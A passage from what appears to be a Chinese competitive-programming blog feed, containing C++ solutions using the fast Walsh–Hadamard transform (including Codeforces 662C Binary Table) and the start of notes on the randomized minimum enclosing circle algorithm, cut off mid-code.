MOD; <span class="keyword">if</span>(x &lt; <span class="number">0</span>) x += MOD; <span class="keyword">return</span> x; &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">muln</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123; <span class="keyword">return</span> <span class="number">1LL</span> * x * y % MOD; &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">qpow</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(; y; y &gt;&gt;= <span class="number">1</span>, x = muln(x, x))</span><br><span class="line">        <span class="keyword">if</span>(y &amp; <span class="number">1</span>) ret = muln(ret, x);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> inv2 = qpow(<span class="number">2</span>, MOD - <span class="number">2</span>), inv4 = qpow(<span class="number">4</span>, MOD - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fwt</span><span class="params">(<span class="keyword">int</span>* arr, <span class="keyword">int</span> dwt = <span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> l, r;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; ++i)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; full; ++S) <span class="keyword">if</span>(~S&gt;&gt;i&amp;<span class="number">1</span>) &#123;</span><br><span class="line">            l = arr[S], r = arr[S|(<span class="number">1</span>&lt;&lt;i)];</span><br><span class="line">            arr[S] = mo(l + r);</span><br><span class="line">            arr[S|(<span class="number">1</span>&lt;&lt;i)] = mo(l - r);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> iv = qpow(full, MOD - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(dwt == <span class="number">-1</span>) <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; full; ++S)</span><br><span class="line">        arr[S] = muln(arr[S], iv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> gg[<span class="number">4</span>], a, b, c, xorsum;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gett</span><span class="params">(ll s, ll t, ll u, ll v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = muln(mo(mo(s+t)+mo(u+v)), inv4);</span><br><span class="line">    <span class="keyword">int</span> y = mo(muln(mo(s+t), inv2) - x);</span><br><span class="line">    <span class="keyword">int</span> z = mo(muln(mo(s+u), inv2) - x);</span><br><span class="line">    <span class="keyword">int</span> w = mo(muln(mo(s+v), inv2) - x);</span><br><span class="line">    <span class="keyword">return</span> muln( muln(qpow(gg[<span class="number">0</span>],x),qpow(gg[<span class="number">1</span>],y)) , muln(qpow(gg[<span class="number">2</span>],z),qpow(gg[<span class="number">3</span>],w)) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d%d&quot;</span>, &amp;n, &amp;k, &amp;a, &amp;b, &amp;c); full = (<span class="number">1</span> &lt;&lt; k);</span><br><span class="line">    gg[<span class="number">0</span>] = mo(mo(a+b)+c), gg[<span class="number">1</span>] = mo(mo(a+b)-c), gg[<span class="number">2</span>] = mo(mo(a-b)+c), gg[<span class="number">3</span>] = mo(mo(a-b)-c);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;A[i], &amp;B[i], &amp;C[i]);</span><br><span class="line">        AB[A[i]^B[i]]++, AC[A[i]^C[i]]++, BC[B[i]^C[i]]++;</span><br><span class="line">        xorsum ^= A[i];</span><br><span class="line">    &#125;</span><br><span class="line">    fwt(AB), fwt(AC), fwt(BC);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; full; ++S) &#123;</span><br><span class="line">        ans[S] = gett(n, AB[S], AC[S], BC[S]);</span><br><span class="line">    &#125;</span><br><span class="line">    fwt(ans, <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; full; ++S)</span><br><span class="line">        out[S] = ans[S ^ xorsum];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; full; ++S)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d%c&quot;</span>, out[S], <span class="string">&quot; \n&quot;</span>[S==full<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div><h2 id="CF662C-超级好题"><a href="#CF662C-超级好题" class="headerlink" title="CF662C 超级好题"></a>CF662C 超级好题</h2><h3 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h3><p>你有一个 $n$ 行 $m$ 列的 01 矩阵，你可以进行翻转行与翻转列两种操作（翻转即 0 变 1，1 变 0）任意多次，问最后得到的矩阵的 1 的个数最少是多少。</p><p>数据范围：$n\leq 20,m\leq 100000$</p><p>Source: CROC 2016 - Final Round <a href="https://codeforces.com/contest/662/C">Problem C. Binary Table</a></p><h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3><p>注意 $n\leq 20$ 的条件。先考虑 $O(m2^n )$ 暴力怎么做。记第 $j$ 列的数的 bitmask 为 $A_j$ ，我们枚举行的翻转状态的 bitmask为 $S$ ，然后对于每一种状态 $S$，我们查看每一列，第 $j$ 列被变为了 $A_j \oplus S$。考虑这一列是否翻转，显见答案增加了 $\min{pop(A_j \oplus S), n-pos(A_J\oplus S)}$，其中 $pop(S)$ 是指 $S$ 二进制表示中 1 的个数。我们记$f(S) = \min{pop(S),n-pop(S)}$ ，那么对于行的枚举状态 $S$ 我们得到的答案就是这个：<br>$$<br>\sum_{i=1}^m f(S\oplus A_i)<br>$$<br>由于 $A_j$ 的值域也是 $2^n$，我们记 $A$ 中 $x$ 这个值出现的次数为 $c(x)$，那么上式可以改写为：<br>$$<br>\sum_{T \subseteq 2^n} f(T \oplus S) \cdot c(T)<br>$$<br>是不是有点 FWT 的形式了？进一步地：<br>$$<br>\begin{aligned}<br>ans(S) &amp;= \sum_{T \oplus U = S} f(T) c(U)<br>\end{aligned}<br>$$<br>这不正是 FWT 吗？于是我们求出 $f$ 与 $c$ 的异或 FWT，然后扫一边 ans 数组找最小值即可。</p><h3 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h3><div><div class="fold_hider"><div class="close hider_title">点击显示/隐藏代码</div></div><div class="fold"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">pair</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxs = (<span class="number">1</span> &lt;&lt; <span class="number">20</span>) + <span class="number">2333</span>, MOD = <span class="number">998244353</span>;</span><br><span class="line"><span class="keyword">int</span> c[maxs], g[maxs], n, m, full , pop[maxs];</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">22</span>][<span class="number">101010</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">mo</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123; <span class="keyword">if</span>(x &gt;= MOD) <span class="keyword">return</span> x-MOD; <span class="keyword">if</span>(x &lt; <span class="number">0</span>) <span class="keyword">return</span> x+MOD; <span class="keyword">return</span> x; &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">muln</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123; <span class="keyword">return</span> (ll)x * y % MOD; &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">qpow</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(; y; y &gt;&gt;= <span class="number">1</span>, x = muln(x, x))</span><br><span class="line">        <span class="keyword">if</span>(y &amp; <span class="number">1</span>) ret = muln(ret, x);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> Base, Len;</span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">fwt</span><span class="params">(<span class="keyword">int</span>* A, <span class="keyword">int</span> dwt = <span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> l, r;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Base; ++i)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; Len; ++S) <span class="keyword">if</span>(~S&gt;&gt;i&amp;<span class="number">1</span>) &#123;</span><br><span class="line">            l = A[S], r = A[S|(<span class="number">1</span>&lt;&lt;i)];</span><br><span class="line">            A[S] = mo(l + r);</span><br><span class="line">            A[S|(<span class="number">1</span>&lt;&lt;i)] = mo(l - r);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span>(dwt==<span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> inv2 = qpow(Len, MOD<span class="number">-2</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; Len; ++S)</span><br><span class="line">            A[S] = muln(A[S], inv2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> A;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    full = (<span class="number">1</span> &lt;&lt; n) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s[i]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; ++j)</span><br><span class="line">            res = <span class="number">2</span> * res + s[j][i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        c[res]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">1</span>; S &lt;= full; ++S) &#123;</span><br><span class="line">        pop[S] = pop[S&gt;&gt;<span class="number">1</span>] + (S&amp;<span class="number">1</span>);</span><br><span class="line">        g[S] = min(pop[S], n - pop[S]);</span><br><span class="line">    &#125;</span><br><span class="line">    Len = <span class="number">1</span>&lt;&lt;n, Base = n;</span><br><span class="line">    fwt(c, <span class="number">1</span>);</span><br><span class="line">    fwt(g, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt;= full; ++S)</span><br><span class="line">        c[S] = muln(c[S], g[S]);</span><br><span class="line">    fwt(c, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt;= full; ++S)</span><br><span class="line">        ans = min(ans, c[S]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div><p>[HDU5909]</p><p>[WC2018]州区划分</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;受这几天看到的不少高维前缀和题目的影响，我决定系统地学习一下集合幂级数的一套理论了。内容主要来自2015年吕凯风（VFleaKing）国家集训队论文《集合幂级数的性质与应用及其快速算法》（pdf版本会放在附录里），包括&lt;strong&gt;集合并卷积、集合对称差卷积、子集卷积、快速莫比乌斯变换、快速莫比乌斯反演、快速沃尔什变换及逆变换&lt;/strong&gt;等，以及附带进行的一些练习。&lt;/p&gt;
&lt;p&gt;(UPD 2021.4.20) 推荐观看：&lt;a href=&quot;https://www.youtube.com/watch?v=lXJP-UkTl-4&amp;list=PLm3J0oaFux3ZYpFLwwrlv_EHH9wtH6pnX&amp;index=23&quot;&gt;Fourier Analysis of Boolean functions || @ CMU || Lecture 8a of CS Theory Toolkit&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="http://yangdong2002.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="快速沃尔什变换系列（FMT，FWT等）" scheme="http://yangdong2002.github.io/tags/%E5%BF%AB%E9%80%9F%E6%B2%83%E5%B0%94%E4%BB%80%E5%8F%98%E6%8D%A2%E7%B3%BB%E5%88%97%EF%BC%88FMT%EF%BC%8CFWT%E7%AD%89%EF%BC%89/"/>
    
    <category term="集合幂级数" scheme="http://yangdong2002.github.io/tags/%E9%9B%86%E5%90%88%E5%B9%82%E7%BA%A7%E6%95%B0/"/>
    
    <category term="子集卷积" scheme="http://yangdong2002.github.io/tags/%E5%AD%90%E9%9B%86%E5%8D%B7%E7%A7%AF/"/>
    
    <category term="高维前缀和（FMT）" scheme="http://yangdong2002.github.io/tags/%E9%AB%98%E7%BB%B4%E5%89%8D%E7%BC%80%E5%92%8C%EF%BC%88FMT%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>最小圆（球）覆盖学习笔记</title>
    <link href="http://yangdong2002.github.io/2019/04/22/%E6%9C%80%E5%B0%8F%E5%9C%86%E8%A6%86%E7%9B%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yangdong2002.github.io/2019/04/22/%E6%9C%80%E5%B0%8F%E5%9C%86%E8%A6%86%E7%9B%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2019-04-22T06:15:14.000Z</published>
    <updated>2019-12-15T14:08:10.327Z</updated>
    
    <content type="html"><![CDATA[<h1 id="最小圆覆盖问题"><a href="#最小圆覆盖问题" class="headerlink" title="最小圆覆盖问题"></a>最小圆覆盖问题</h1><p>给出 $N$ 个点，让你画一个最小的包含所有点的圆。输出圆心、半径。</p><p>数据范围 $N\leq 10^5$</p><p>模板提交链接：[<a href="https://www.luogu.org/problemnew/show/P1742">Luogu 1742</a>] [<a href="https://lydsy.com/JudgeOnline/problem.php?id=1337">BZOJ 1337</a>]</p><span id="more"></span><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>一般有两种做法：随机增量法与模拟退火法。随机增量法是一种确定性算法，随机意义下均摊复杂度 $O(n)$ ，而且可以达到很高的精度（可达到 $10^{-10}$ 量级）；而模拟退火法是启发式算法，需要结合调整参数从而得到一定精度，精度一般只可以可达到 $10^{-5}$ 量级。</p><h2 id="随机增量法"><a href="#随机增量法" class="headerlink" title="随机增量法"></a>随机增量法</h2><p>为了保证随机情况下的均摊性质，我们首先将给出的点随机打乱。</p><p>然后基于下面的事实进行操作：</p><blockquote><p>如果点 $p$ 不在集合 $S$ 的最小覆盖圆内，则 $p$ 一定在 $S\cup{p}$ 的最小覆盖圆上。</p></blockquote><p>根据这个定理，我们可以分三次确定前 $i$ 个点的最小覆盖圆。</p><ul><li>1.令前 $i-1$ 个点的最小覆盖圆为 $C$</li><li>2.如果第 $i$ 个点在 $C$ 内，则前 $i$ 个点的最小覆盖圆也是 $C$</li><li>3.如果不在，那么第 $i$ 个点一定在前 $i$个点的最小覆盖圆上，接着确定前 $i-1$ 个点中还有哪两个在最小覆盖圆上。因此，设当前圆心为 $P_i$，半径为 $0$，做固定了第 $i$ 个点的前 $i$ 个点的最小圆覆盖。</li><li>4.固定了一个点：不停地在范围内找到第一个不在当前最小圆上的点 $P_j$，设当前圆心为 $(P_i+P_j)/2$，半径为 $\frac{1}{2}|P_iP_j|$，做固定了两个点的，前 $j$ 个点外加第 $i$ 个点的最小圆覆盖。</li><li>5.固定了两个点：不停地在范围内找到第一个不在当前最小圆上的点 $P_k$，设当前圆为 $P_i,P_j,P_k $ 的外接圆。</li></ul><p>核心代码非常简洁：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">mt19937 <span class="title">rng</span><span class="params">(chrono::steady_clock::now().time_since_epoch().count())</span></span>;</span><br><span class="line"><span class="function">Circle <span class="title">MinCircle</span><span class="params">(<span class="built_in">vector</span>&lt;Point&gt; pt)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sz = pt.size();</span><br><span class="line">    shuffle(pt.begin(), pt.end(), rng);</span><br><span class="line">    <span class="function">Circle <span class="title">cc</span><span class="params">(pt[<span class="number">0</span>], <span class="number">0.0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; sz; ++i) <span class="keyword">if</span>(cc.out(pt[i])) &#123;</span><br><span class="line">        cc = Circle(pt[i], <span class="number">0.0</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; ++j) <span class="keyword">if</span>(cc.out(pt[j])) &#123;</span><br><span class="line">            cc = Circle((pt[i] + pt[j]) / <span class="number">2.0</span>, length(pt[i]-pt[j]) / <span class="number">2.0</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; j; ++k) &#123;</span><br><span class="line">                <span class="keyword">if</span>(cc.out(pt[k])) &#123;</span><br><span class="line">                    cc = Circle(pt[i], pt[j], pt[k]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种做法乍一看是 $O(n^3)$ 的，可是实际上均摊意义下他就是 $O(n)$ 的。证法我现在还不会，留坑。</p><p><strong>Code：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// luogu-judger-enable-o2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i, n) for(int i = 1, i##_end_ = (n); i &lt;= i##_end_; ++i)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">pair</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">102000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">double</span> eps = <span class="number">1e-10</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sgn</span><span class="params">(<span class="keyword">double</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">fabs</span>(x) &lt; eps) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> x &lt; <span class="number">0</span> ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span> &#123;</span></span><br><span class="line">    <span class="keyword">double</span> x, y;</span><br><span class="line">    Point(<span class="keyword">double</span> xp=<span class="number">0</span>, <span class="keyword">double</span> yp=<span class="number">0</span>): x(xp), y(yp) &#123; &#125;</span><br><span class="line">    Point <span class="keyword">operator</span> + (<span class="keyword">const</span> Point&amp; rhs) <span class="keyword">const</span> &#123; <span class="keyword">return</span> Point(x+rhs.x, y+rhs.y); &#125;</span><br><span class="line">    Point <span class="keyword">operator</span> - (<span class="keyword">const</span> Point&amp; rhs) <span class="keyword">const</span> &#123; <span class="keyword">return</span> Point(x-rhs.x, y-rhs.y); &#125;</span><br><span class="line">    Point <span class="keyword">operator</span> * (<span class="keyword">const</span> <span class="keyword">double</span>&amp; k) <span class="keyword">const</span> &#123; <span class="keyword">return</span> Point(x*k, y*k); &#125;</span><br><span class="line">    Point <span class="keyword">operator</span> / (<span class="keyword">const</span> <span class="keyword">double</span>&amp; k) <span class="keyword">const</span> &#123; <span class="keyword">return</span> Point(x/k, y/k); &#125;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> Point&amp; rhs) <span class="keyword">const</span> &#123; <span class="keyword">return</span> x &lt; rhs.x || (x==rhs.x &amp;&amp; y&lt;rhs.y); &#125;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> == (<span class="keyword">const</span> Point&amp; rhs) <span class="keyword">const</span> &#123;<span class="keyword">return</span> sgn(x - rhs.x) == <span class="number">0</span> &amp;&amp; sgn(y - rhs.y) == <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="function">Point <span class="title">turn</span><span class="params">(<span class="keyword">double</span> rad)</span> </span>&#123; <span class="keyword">return</span> Point(x*<span class="built_in">cos</span>(rad)-y*<span class="built_in">sin</span>(rad), x*<span class="built_in">sin</span>(rad)+y*<span class="built_in">cos</span>(rad)); &#125;</span><br><span class="line">    <span class="function">Point <span class="title">turn90</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Point(-y, x); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">scan</span><span class="params">()</span> </span>&#123; <span class="built_in">scanf</span>(<span class="string">&quot;%lf%lf&quot;</span>, &amp;x, &amp;y); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> Point Vector;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">dot</span><span class="params">(Vector x, Vector y)</span> </span>&#123; <span class="keyword">return</span> x.x*y.x + x.y*y.y; &#125;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">length</span><span class="params">(Vector x)</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">sqrt</span>(dot(x, x)); &#125;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">cross</span><span class="params">(Vector A, Vector B)</span> </span>&#123; <span class="keyword">return</span> A.x*B.y - A.y*B.x; &#125;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">angle</span><span class="params">(Vector A, Vector B)</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">acos</span>(dot(A, B) / length(A) / length(B)); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Point <span class="title">LLIntPV</span><span class="params">(Point P, Vector v, Point Q, Vector w)</span> </span>&#123;</span><br><span class="line">    Vector u = P - Q;</span><br><span class="line">    assert(cross(v, w) != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">double</span> t = cross(w, u) / cross(v, w);</span><br><span class="line">    <span class="keyword">return</span> P + v * t;</span><br><span class="line">&#125; <span class="comment">// Line: Point + Vector</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Circle</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Circle</span> &#123;</span></span><br><span class="line">    Point o;</span><br><span class="line">    <span class="keyword">double</span> r;</span><br><span class="line">    Circle(Point O, <span class="keyword">double</span> R): o(O), r(R) &#123; &#125;</span><br><span class="line">    Circle(Point A, Point B, Point C) &#123;</span><br><span class="line">        assert(sgn(cross(B-A, C-A)) != <span class="number">0</span>);</span><br><span class="line">        Point mab = (A + B) / <span class="number">2.0</span>, ab = (B - A).turn90();</span><br><span class="line">        Point mbc = (B + C) / <span class="number">2.0</span>, bc = (C - B).turn90();</span><br><span class="line">        o = LLIntPV(mab, ab, mbc, bc);</span><br><span class="line">        r = length(A - o);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">Point <span class="title">at</span><span class="params">(<span class="keyword">double</span> theta)</span> </span>&#123; <span class="keyword">return</span> o + Point(<span class="built_in">cos</span>(theta)*r, <span class="built_in">sin</span>(theta)*r); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">out</span><span class="params">(Point pt)</span> </span>&#123; <span class="keyword">return</span> sgn(length(o-pt) - r) == <span class="number">1</span>;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span 